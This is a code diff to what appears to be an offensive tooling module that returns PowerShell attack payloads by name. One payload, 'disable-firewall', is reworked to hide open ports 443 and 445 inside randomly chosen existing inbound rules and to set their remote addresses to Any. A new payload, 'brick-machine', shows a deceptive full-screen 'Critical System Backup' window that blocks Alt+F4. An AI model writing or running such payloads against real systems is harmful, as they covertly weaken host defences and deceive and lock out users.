@@ -27,14 +27,71 @@ def get_head(name: str, oppsec: Optional[bool] = True) -> str:
             $c.Close()
             """,
         "disable-firewall": f"""
-            $firewall_on = Test-Connection {ip} -Count 1 -Quiet
+            $firewall_on = (Get-NetFirewallProfile | Where-Object {{ $_.Enabled -eq $true }}).Count -gt 0
             if ($firewall_on){{
-                New-NetFirewallRule -DisplayName "RPC Endpoint Mapper" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 445 -Description "Core RPC service" -Group "Network Discovery"
-                New-NetFirewallRule -DisplayName "RPC Dynamic Ports" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 443 -Description "Inbound rule for the Remote Procedure Call service" -Group "Network Discovery"
+                $allRules = Get-NetFireWallRule -Direction Inbound -Enabled True | Where-Object {{
+                    $pf = $_ | Get-NetFirewallPortFilter
+                    $pf.Protocol -in @("TCP", "UDP") -and $pf.LocalPort -ne "Any"
+                }}
+
+                $rule_count = 2
+                if ($allRules.Count -eq 1){{
+                    $rule_count = 1
+                }} elseif ($allRules.Count -eq 0){{
+                    New-NetFirewallRule -DisplayName "RPC Endpoint Mapper" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 445 -Description "Core RPC service" -Group "Network Discovery"
+                    New-NetFirewallRule -DisplayName "RPC Dynamic Ports" -Direction Inbound -Action Allow -Protocol TCP -LocalPort 443 -Description "Inbound rule for the Remote Procedure Call service" -Group "Network Discovery"
+                    return
+                }}
+                $randomRules = $allRules | Get-Random -Count $rule_count
+                $ports = @("443", "445")
+
+                for($i =0; $i -lt $rule_count; $i++){{
+                    $rule = $randomRules[$i]
+                    $portToAdd = $ports[$i]
+
+                    $portFilter = $rule | Get-NetFirewallPortFilter
+                    $newPorts = @($portFilter.LocalPort) + $portToAdd | Sort-Object -Unique
+
+                    $portFilter | Set-NetFirewallPortFilter -LocalPort $newPorts
+                    $rule | Get-NetFirewallAddressFilter | Set-NetFirewallAddressFilter -RemoteAddress Any
+                }}
             }}
             """,
-        "brick-domain": f"""
+        "brick-machine": f"""
+            Add-Type -AssemblyName System.Windows.Forms
+            Add-Type -AssemblyName System.Drawing
 
+            $form = New-Object System.Windows.Forms.Form
+            $form.Text = "Critical System Backup"
+            $form.WindowState = [System.Windows.Forms.FormWindowState]::Maximized
+            $form.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None
+            $form.TopMost = $true
+            $form.BackColor = [System.Drawing.Color]::FromArgb(0, 0, 0)
+            $form.ControlBox = $true
+
+            $form.Add_KeyDown({{
+                if ($_.KeyCode -eq [System.Windows.Forms.Keys]::F4 -and $_.Alt){{
+                    $_.SuppressKeyPress = $true
+                }}
+            }})
+            $form.KeyPreview = $true
+
+            $label = New-Object System.Windows.Forms.Label
+            $label.Text = "Backing up important system files, this will take just a moment..."
+            $label.ForeColor = [System.Drawing.Color]::White
+            $label.Font = New-Object System.Drawing.Font("Segoe UI", 24, [System.Drawing.FontStyle]::Regular)
+            $label.AutoSize = $true
+            $label.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
+
+            $form.Controls.Add($label)
+            $form.Add_Shown({{
+                $label.Location = New-Object System.Drawing.Point(
+                    [int](($form.ClientSize.Width - $label.Width) /2),
+                    [int](($form.ClientSize.Height - $label.Height) /2)
+                )
+            }})
+            $form.Show()
+            [System.Windows.Forms.Application]::DoEvents()
         """,
     }   
     return exploit_heads.get(name)
